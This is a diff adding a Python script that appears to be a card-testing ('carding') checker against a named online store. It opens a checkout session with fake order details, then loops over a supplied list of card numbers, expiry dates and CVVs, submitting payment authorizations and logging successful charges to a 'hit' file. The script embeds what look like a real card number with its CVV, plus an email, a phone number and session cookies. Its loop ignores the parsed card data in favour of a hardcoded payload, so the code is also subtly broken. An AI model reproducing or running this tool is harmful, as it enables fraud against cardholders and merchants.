@@ -1,0 +1,95 @@
+import requests,string,re
+
+import requests
+
+url = "https://store.tactical-performance.com/OUSL.html"
+
+payload = "Action=ORDR&ShipFirstName=Jones&ShipLastName=Jones&ShipCompany=New+York&ShipEmail=aqga347%40gmail.com&ShipPhone=12058809966&customer_create_url=https%3A%2F%2Fstore.tactical-performance.com%2Fmm5%2Fmerchant.mvc%3F&Customer_LoginEmail=aqga347%40gmail.com&Customer_Password=&Customer_VerifyPassword=&ShipAddress1=East+14th+Street&ShipAddress2=&ShipCity=New+York&ShipCountry=US&ShipStateSelect=NY&ShipState=&ShipZip=10080&billing_to_show=1&BillFirstName=Jones&BillLastName=Jones&BillCompany=New+York&BillEmail=aqga347%40gmail.com&BillPhone=12058809966&BillAddress1=East+14th+Street&BillAddress2=&BillCity=New+York&BillCountry=US&BillStateSelect=NY&BillState=&BillZip=10080"
+
+headers = {
+  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+  'Content-Type': "application/x-www-form-urlencoded",
+  'Cache-Control': "max-age=0",
+  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+  'sec-ch-ua-mobile': "?1",
+  'sec-ch-ua-platform': "\"Android\"",
+  'Upgrade-Insecure-Requests': "1",
+  'Origin': "https://store.tactical-performance.com",
+  'Sec-Fetch-Site': "same-origin",
+  'Sec-Fetch-Mode': "navigate",
+  'Sec-Fetch-User': "?1",
+  'Sec-Fetch-Dest': "document",
+  'Referer': "https://store.tactical-performance.com/mm5/merchant.mvc?",
+  'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+  'Cookie': "mm5-TP-basket-id=9e0a8a3dbbbc0016958b594d56a638ff; _fbp=fb.1.1714047981066.495543312; _ga=GA1.1.823280225.1714047981; cookieconsent_status=dismiss; RESS_width=381; _ga_6163S9C83V=GS1.1.1714051479.2.1.1714051488.51.0.0"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+mm5TPcheckout=(response.cookies['mm5-TP-checkout-session'])
+
+def capture(string, start, end):
+    start_pos, end_pos = string.find(start), string.find(
+        end, string.find(start) + len(start)
+    )
+    return (
+        string[start_pos + len(start) : end_pos]
+        if start_pos != -1 and end_pos != -1
+        else None
+    )
+
+file=input('enter cc list: ')
+try:
+	g=open(file,'r')	
+except:print('error name list :)');exit()
+for g in g:
+	c = g.strip().split('\n')[0]
+	cc = c.split('|')[0]
+	exp=c.split('|')[1]
+	ex=c.split('|')[2]
+	try:
+		exy=ex[2]+ex[3]
+		if '2' in ex[3] or '1' in ex[3]:
+			exy=ex[2]+'7'
+		else:pass
+	except:
+		exy=ex[0]+ex[1]
+		if '2' in ex[1] or '1' in ex[1]:
+			exy=ex[0]+'7'
+		else:pass
+	cvc=c.split('|')[3]
+	url = "https://store.tactical-performance.com/mm5/merchant.mvc"
+	
+	payload = "Action=AUTH&Screen=INVC&Store_Code=TP&SplitPaymentData=&PaymentDescription=MasterCard&CHASEPaymentech_CC_Name=Mohamed+Sarah&CHASEPaymentech_CC_Number=4159+7700+3562+1639&CHASEPaymentech_CC_ExpMonth=1&CHASEPaymentech_CC_ExpYear=2027&CHASEPaymentech_CC_CVV=566&PaymentMethod=chasepaytech%3AVI"
+
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+	  'Content-Type': "application/x-www-form-urlencoded",
+	  'Cache-Control': "max-age=0",
+	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Upgrade-Insecure-Requests': "1",
+	  'Origin': "https://store.tactical-performance.com",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "navigate",
+	  'Sec-Fetch-User': "?1",
+	  'Sec-Fetch-Dest': "document",
+	  'Referer': "https://store.tactical-performance.com/opay.html",
+	  'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+	  'Cookie': "mm5-TP-basket-id=9e0a8a3dbbbc0016958b594d56a638ff; RESS_width=381; _fbp=fb.1.1714047981066.495543312; _ga=GA1.1.823280225.1714047981; cookieconsent_status=dismiss; mm5-TP-checkout-session="+mm5TPcheckout+"; _ga_6163S9C83V=GS1.1.1714047981.1.1.1714048073.34.0.0"
+	}
+	
+	r = requests.post(url, data=payload, headers=headers).text
+	p=capture(r, '<p class="message message-error">','<br>')
+	if p:
+		print(f'{c}'+'|'+p.split("\n")[1])
+	else:
+		if 'Confirmation' in r or "This page doesn't seem to exist" in r or "successfully" in r or "success" in r or "Thank you" in r:
+			print(f'{c}|Chargr')
+			open('hit.txt','a').write(f"{c}|Charge\n")
+		else:
+			print(f'{c}|You Card Declined')
